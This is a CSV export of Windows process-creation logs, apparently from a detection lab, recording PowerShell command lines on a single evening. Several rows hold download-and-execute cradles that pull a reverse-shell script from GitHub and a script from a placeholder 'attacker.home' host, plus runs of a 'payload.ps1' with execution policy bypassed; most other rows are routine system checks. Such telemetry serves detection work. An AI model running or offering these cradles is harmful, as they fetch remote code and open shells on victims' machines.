"@timestamp","process.name","process.command_line","process.args","event.code","winlog.event_id"
"Jun 4, 2025 @ 21:01:29.980","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:01:24.335","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)","-","-"
"Jun 4, 2025 @ 21:01:24.335","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",1,1
"Jun 4, 2025 @ 20:56:36.798","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)","-","-"
"Jun 4, 2025 @ 20:56:36.798","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)",1,1
"Jun 4, 2025 @ 20:17:00.269","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:16:48.920","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:16:48.920","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:16:18.287","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:14:33.919","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:14:33.919","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res",1,1
"Jun 4, 2025 @ 20:14:31.511","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:14:12.367","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:14:12.367","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;",1,1
"Jun 4, 2025 @ 20:14:04.744","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:14:04.744","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",1,1
"Jun 4, 2025 @ 20:13:51.735","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:13:48.494","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res","-","-"
"Jun 4, 2025 @ 20:13:48.494","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res","powershell.exe, -ExecutionPolicy, Restricted, -Command, $res, =, 0;, if(get-vmswitch, |, Where, {$_.NetAdapterInterfaceDescription, -ne, $null, -and, $_.NetAdapterInterfaceDescription, -eq, (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1};, Write-Host, Final result:,, $res",1,1
"Jun 4, 2025 @ 20:13:27.055","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;","-","-"
"Jun 4, 2025 @ 20:13:27.055","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;","powershell.exe, -ExecutionPolicy, Restricted, -Command, $Res, =, 0;, $Infs, =, Get-Item, -Path, ($env:WinDir, +, '\inf\*.inf');, foreach, ($Inf, in, $Infs), {, $Data, =, Get-Content, $Inf.FullName;, if, ($Data, -match, '\[defaultinstall.nt(amd64|arm|arm64|x86)\]'), {, $Res, =, 1;, break;, }, }, Write-Host, 'Final, result:',, $Res;",1,1
"Jun 4, 2025 @ 20:13:17.462","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';","-","-"
"Jun 4, 2025 @ 20:13:17.462","powershell.exe","powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';","powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",1,1
"Jun 4, 2025 @ 19:45:10.759","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1","-","-"
"Jun 4, 2025 @ 19:45:10.759","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1",1,1
"Jun 4, 2025 @ 19:44:58.129","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1","-","-"
"Jun 4, 2025 @ 19:44:48.288","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1","-","-"
"Jun 4, 2025 @ 19:44:48.288","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Bypass -File C:\payload.ps1","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -ExecutionPolicy, Bypass, -File, C:\payload.ps1",1,1
"Jun 4, 2025 @ 19:44:09.178","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-"
"Jun 4, 2025 @ 19:44:09.178","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",1,1
